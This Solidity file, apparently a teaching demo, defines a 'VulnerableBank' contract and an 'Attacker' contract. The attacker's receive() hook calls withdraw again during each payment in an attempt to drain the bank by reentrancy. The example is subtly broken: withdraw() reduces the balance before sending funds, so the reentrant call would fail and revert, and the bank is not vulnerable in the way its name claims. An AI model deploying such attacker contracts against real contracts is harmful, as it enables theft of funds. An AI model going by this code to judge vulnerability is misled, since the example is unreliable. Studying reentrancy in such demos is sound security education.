// // SPDX-License-Identifier: MIT

pragma solidity >=0.6.10;

contract VulnerableBank {
  mapping (address => uint256) public balances;
  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function deposit() public payable{
    balances[msg.sender] += msg.value;
  }

  function withdraw(uint _amount) public {
    require (balances[msg.sender] >= _amount, "Insufficient funds");

    balances[msg.sender] -= _amount;

    (bool sent, ) = msg.sender.call{value: _amount}("");
    require(sent, "Failed to send funds");

  }

  function getBalance() public view returns (uint) {
    return address(this).balance;
  }
}

contract Attacker {
  VulnerableBank bank;

  constructor(address _bank) public {
    bank = VulnerableBank(_bank);
  }

  receive() external payable {
    if (bank.getBalance() >= 1 ether){
      bank.withdraw(1 ether);
    }
  }

  function attack() external payable{
    require(msg.value >= 1 ether);

    bank.deposit{value: msg.value}();

    bank.withdraw(10**18);
  }

  function getBalance() public view returns(uint){
    return address(this).balance;
  }
}
